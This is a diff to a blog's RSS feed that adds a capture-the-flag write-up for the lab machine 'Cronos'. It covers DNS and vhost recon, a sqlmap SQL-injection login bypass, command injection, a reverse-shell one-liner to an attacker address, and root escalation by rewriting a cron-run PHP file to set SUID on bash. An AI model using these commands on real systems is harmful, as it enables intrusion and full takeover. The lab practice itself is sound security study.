@@ -4,9 +4,121 @@
         <title></title>
         <link>undefined</link>
         <description>undefined</description>
-        <lastBuildDate>Mon, 14 Oct 2024 21:05:31 GMT</lastBuildDate>
+        <lastBuildDate>Tue, 15 Oct 2024 15:42:23 GMT</lastBuildDate>
         <docs>https://validator.w3.org/feed/docs/rss2.html</docs>
         <generator>Joplin Pages Publisher</generator>
+        <item>
+            <title><![CDATA[Cronos]]></title>
+            <guid>d6247cd8720c4b6cafe61f75ee4cd4c1</guid>
+            <pubDate>Tue, 15 Oct 2024 10:13:56 GMT</pubDate>
+            <content:encoded><![CDATA[<h1 id="recon">Recon</h1>
+<p>Let’s welcome Apache default paga again.</p>
+<p><img src="/_resources/087db3a1b36f4819b376b7ba90d9addb.png" /></p>
+<div><pre class="hljs"><code>└──╼ <span class="hljs-variable">$nmap</span> -p- -A <span class="hljs-number">10.129</span>.<span class="hljs-number">194.97</span>
+Starting Nmap <span class="hljs-number">7.94</span>SVN ( <span class="hljs-symbol">https:</span>//nmap.org ) at <span class="hljs-number">2024</span><span class="hljs-number">-10</span><span class="hljs-number">-15</span> <span class="hljs-number">10</span><span class="hljs-symbol">:</span><span class="hljs-number">15</span> UTC
+Nmap scan report <span class="hljs-keyword">for</span> <span class="hljs-number">10.129</span>.<span class="hljs-number">194.97</span>
+Host is up (<span class="hljs-number">0.037</span>s latency).
+Not <span class="hljs-symbol">shown:</span> <span class="hljs-number">65532</span> closed tcp ports (conn-refused)
+PORT   STATE SERVICE VERSION
+<span class="hljs-number">22</span>/tcp open  ssh     OpenSSH <span class="hljs-number">7.2</span>p2 Ubuntu <span class="hljs-number">4</span>ubuntu2.<span class="hljs-number">1</span> (Ubuntu Linux; protocol <span class="hljs-number">2.0</span>)
+| ssh-<span class="hljs-symbol">hostkey:</span> 
+|   <span class="hljs-number">2048</span> <span class="hljs-number">18</span><span class="hljs-symbol">:b9</span><span class="hljs-symbol">:</span><span class="hljs-number">73</span><span class="hljs-symbol">:</span><span class="hljs-number">82</span><span class="hljs-symbol">:</span><span class="hljs-number">6</span><span class="hljs-symbol">f:</span><span class="hljs-number">26</span><span class="hljs-symbol">:c7</span><span class="hljs-symbol">:</span><span class="hljs-number">78</span><span class="hljs-symbol">:</span><span class="hljs-number">8</span><span class="hljs-symbol">f:</span><span class="hljs-number">1</span><span class="hljs-symbol">b:</span><span class="hljs-number">39</span><span class="hljs-symbol">:</span><span class="hljs-number">88</span><span class="hljs-symbol">:d8</span><span class="hljs-symbol">:</span><span class="hljs-number">02</span><span class="hljs-symbol">:ce</span><span class="hljs-symbol">:e8</span> (RSA)
+|   <span class="hljs-number">256</span> <span class="hljs-number">1</span><span class="hljs-symbol">a:</span><span class="hljs-symbol">e6:</span><span class="hljs-number">06</span><span class="hljs-symbol">:a6</span><span class="hljs-symbol">:</span><span class="hljs-number">05</span><span class="hljs-symbol">:</span><span class="hljs-number">0</span><span class="hljs-symbol">b:</span><span class="hljs-symbol">bb:</span><span class="hljs-number">41</span><span class="hljs-symbol">:</span><span class="hljs-number">92</span><span class="hljs-symbol">:b0</span><span class="hljs-symbol">:</span><span class="hljs-number">28</span><span class="hljs-symbol">:bf</span><span class="hljs-symbol">:</span><span class="hljs-number">7</span><span class="hljs-symbol">f:</span><span class="hljs-symbol">e5:</span><span class="hljs-number">96</span><span class="hljs-symbol">:</span><span class="hljs-number">3</span>b (ECDSA)
+|_  <span class="hljs-number">256</span> <span class="hljs-number">1</span><span class="hljs-symbol">a:</span><span class="hljs-number">0</span><span class="hljs-symbol">e:</span><span class="hljs-symbol">e7:</span><span class="hljs-symbol">ba:</span><span class="hljs-number">00</span><span class="hljs-symbol">:cc</span><span class="hljs-symbol">:</span><span class="hljs-number">02</span><span class="hljs-symbol">:</span><span class="hljs-number">01</span><span class="hljs-symbol">:</span><span class="hljs-number">04</span><span class="hljs-symbol">:cd</span><span class="hljs-symbol">:a3</span><span class="hljs-symbol">:a9</span><span class="hljs-symbol">:</span><span class="hljs-number">3</span><span class="hljs-symbol">f:</span><span class="hljs-number">5</span><span class="hljs-symbol">e:</span><span class="hljs-number">22</span><span class="hljs-symbol">:</span><span class="hljs-number">20</span> (ED25519)
+<span class="hljs-number">53</span>/tcp open  domain  ISC BIND <span class="hljs-number">9.10</span>.<span class="hljs-number">3</span>-P4 (Ubuntu Linux)
+| dns-<span class="hljs-symbol">nsid:</span> 
+|_  <span class="hljs-symbol">bind.version:</span> <span class="hljs-number">9.10</span>.<span class="hljs-number">3</span>-P4-Ubuntu
+<span class="hljs-number">80</span>/tcp open  http    Apache httpd <span class="hljs-number">2.4</span>.<span class="hljs-number">18</span> ((Ubuntu))
+|_http-server-<span class="hljs-symbol">header:</span> Apache/<span class="hljs-number">2.4</span>.<span class="hljs-number">18</span> (Ubuntu)
+|_http-<span class="hljs-symbol">title:</span> Apache2 Ubuntu Default <span class="hljs-symbol">Page:</span> It works
+Service <span class="hljs-symbol">Info:</span> <span class="hljs-symbol">OS:</span> Linux; <span class="hljs-symbol">CPE:</span> <span class="hljs-symbol">cpe:</span>/<span class="hljs-symbol">o:</span><span class="hljs-symbol">linux:</span>linux_kernel
+
+Service detection performed. Please report any incorrect results at <span class="hljs-symbol">https:</span>//nmap.org/submit/ .
+Nmap <span class="hljs-symbol">done:</span> <span class="hljs-number">1</span> IP address (<span class="hljs-number">1</span> host up) scanned <span class="hljs-keyword">in</span> <span class="hljs-number">25.57</span> seconds</code></pre></div>
+<p>Lets look for the domain further with reverse dns search, as the dns is setup on the server clearly for a reason.</p>
+<div><pre class="hljs"><code>└──╼ $dig -x 10.129.194.97 @10.129.194.97
+
+; &lt;&lt;&gt;&gt; DiG 9.18.28-1~deb12u2-Debian &lt;&lt;&gt;&gt; -x 10.129.194.97 @10.129.194.97
+;; global options: +cmd
+;; Got answer:
+;; -&gt;&gt;HEADER&lt;&lt;- opcode: QUERY, status: NOERROR, id: 28739
+;; flags: qr aa rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 1, ADDITIONAL: 2
+
+;; OPT PSEUDOSECTION:
+; EDNS: version: 0, flags:; udp: 4096
+;; QUESTION SECTION:
+;97.194.129.10.in-addr.arpa.	IN	PTR
+
+;; ANSWER SECTION:
+97.194.129.10.in-addr.arpa. 604800 IN	PTR	ns1.cronos.htb.
+
+;; AUTHORITY SECTION:
+129.10.in-addr.arpa.	604800	IN	NS	ns1.cronos.htb.
+
+;; ADDITIONAL SECTION:
+ns1.cronos.htb.		604800	IN	A	10.10.10.13
+
+;; Query time: 36 msec
+;; SERVER: 10.129.194.97#53(10.129.194.97) (UDP)
+;; WHEN: Tue Oct 15 10:29:00 UTC 2024
+;; MSG SIZE  rcvd: 113</code></pre></div>
+<p>Adding <code>cronos.htb</code> as our ip (in my case 10.129.194.97) let’s us access a new site.</p>
+<p><img src="/_resources/1ea5a0e2c68148c3aa2ac06e1783d4ee.png" /></p>
+<p>Going to the “Documentation” redirect us to <a title="https://laravel.com/docs/11.x" href="https://laravel.com/docs/11.x">Laravel docs</a>, something deffinietly worth investigating later.“Laracasts” goes to <a title="https://laracasts.com/" href="https://laracasts.com/">Laracasts</a>, whatever that is. “News” goes to <a title="https://laravel-news.com/" href="https://laravel-news.com/">laravel-news</a>, [forge] goes to <a title="https://forge.laravel.com/" href="https://forge.laravel.com/">laravel forge</a> and github goes to <a title="https://github.com/laravel/laravel" href="https://github.com/laravel/laravel">laravel’s github</a>. Quite a lot of laravel if you ask me. Wappalyzer does not show it on this site, but running whatweb does (if the hint left by the author wasn’t enough). Let’s learn about it then.</p>
+<div><pre class="hljs"><code><span class="hljs-variable">$whatweb</span> http://www.cronos.htb/
+http://www.cronos.htb/ [200 OK] Apache[2.4.18], Cookies[XSRF-TOKEN,laravel_session], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.18 (Ubuntu)], HttpOnly[laravel_session], IP[10.129.194.97], Laravel, Title[Cronos], X-UA-Compatible[IE=edge]</code></pre></div>
+<p>Laravel is “The PHP Framework for Web Artisans”, whatever that means. What is more interesting that it has a few <a title="https://app.opencve.io/cve/?vendor=laravel" href="https://app.opencve.io/cve/?vendor=laravel">CVE’s</a> with pretty high severity. There is a lot of talking about login bypass, but we do not have a log in window yet.</p>
+<div><pre class="hljs"><code>└──╼ $gobuster vhost -w /usr/share/wordlists/seclists/Discovery/DNS/n0kovo_subdomains.txt -u http://cronos.htb  --append-domain -t 150
+===============================================================
+Gobuster v3.6
+by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:             http://cronos.htb
+[+] Method:          GET
+[+] Threads:         150
+[+] Wordlist:        /usr/share/wordlists/seclists/Discovery/DNS/n0kovo_subdomains.txt
+[+] User Agent:      gobuster/3.6
+[+] Timeout:         10s
+[+] Append Domain:   true
+===============================================================
+Starting gobuster in VHOST enumeration mode
+===============================================================
+Found: admin.cronos.htb Status: 200 [Size: 1547]
+Found: ADMIN.cronos.htb Status: 200 [Size: 1547]
+Found: Admin.cronos.htb Status: 200 [Size: 1547]</code></pre></div>
+<p><img src="/_resources/58abd81ddea44fda9a16328865ee6a66.png" /></p>
+<p>That’s better. First let’s attack it with sqlmap, as it looks like a custom login page.</p>
+<div><pre class="hljs"><code>sqlmap -r tmp.req --level <span class="hljs-number">5</span> --risk <span class="hljs-number">3</span> --dump -v <span class="hljs-number">3</span>
+[<span class="hljs-number">12</span>:<span class="hljs-number">26</span>:<span class="hljs-number">40</span>] [PAYLOAD] -<span class="hljs-number">3434</span>' OR <span class="hljs-number">9239</span>=<span class="hljs-number">9239</span>-- rKXH
+got a 302 redirect to 'http:<span class="hljs-comment">//admin.cronos.htb/welcome.php'. Do you want to follow? [Y/n] </span></code></pre></div>
+<p>It works and we are greeted with Net Tool v 0.1.</p>
+<h1 id="net-tool-v01">Net Tool v0.1</h1>
+<p><img src="/_resources/95cb6594901a4b9da6772284d0036081.png" /></p>
+<p>Net Tool allows us to use ping and traceroute. Looking at the requests sent in burp, we can see that’s not the only thing we can use.</p>
+<p><img src="/_resources/2e2266f06ea2426492c112153aac59df.png" /></p>
+<p>Changing command to <code>ls</code> and host to <code>/</code> works.</p>
+<p><img src="/_resources/f3f180edbd0842a1b154828ed168726b.png" />.</p>
+<p>Listing <code>/home</code> shows us folder <code>noulis</code>, but unfortunetly there is no .ssh folder. We have to create reverse shell then. I had some problems with executing <code>sh -i &gt;&amp; /dev/udp/10.0.0.1/4242 0&gt;&amp;1</code> this way, so I’ve created shell.sh file with it, run wget on the server, set up netcat and run the script. We are in.</p>
+<p><img src="/_resources/cdb693d257714d98b796368eff881116.png" /></p>
+<p><img src="/_resources/49e7160d8da54b3099422ec3c2450311.png" /></p>
+<p><img src="/_resources/bc5618c1788e4b50ba688c82f26e6f9e.png" /></p>
+<p>Just standard shell stabilistaion at the end.</p>
+<div><pre class="hljs"><code>python3 -c <span class="hljs-string">'import pty;pty.spawn("/bin/bash")'</span>
+<span class="hljs-built_in">export</span> <span class="hljs-attribute">TERM</span>=xterm
+CTRL-Z
+stty<span class="hljs-built_in"> raw </span>-echo; fg</code></pre></div>
+<p>We have user access, so we can access user.txt file from the home folder. Time to get root.</p>
+<h1 id="priv-esc">Priv esc</h1>
+<p>Running linenum, we can find cronjob running every minute, finally something more with laravel.<br />
+<code>* * * * *	root	php /var/www/laravel/artisan schedule:run &gt;&gt; /dev/null 2&gt;&amp;1</code></p>
+<p>It turns out, we can modify <code>artisan</code> file, so lets just remove it’s previous contents and replace it with nicer php code.</p>
+<div><pre class="hljs"><code><span class="hljs-meta">&lt;?php</span>
+shell_exec(<span class="hljs-string">'chmod u+s /bin/bash'</span>);
+<span class="hljs-meta">?&gt;</span></code></pre></div>
+<p>Then run <code>/bin/bash -p</code> and we are in. Nice and simple. We did’t use laravel though, somehow.</p>
+<p><img src="/_resources/ec8c13cb6ad6459095ed26445f46d692.png" /></p>
+]]></content:encoded>
+        </item>
         <item>
             <title><![CDATA[Europa]]></title>
             <guid>a9533d4964fa44b4903c9bca530901e5</guid>
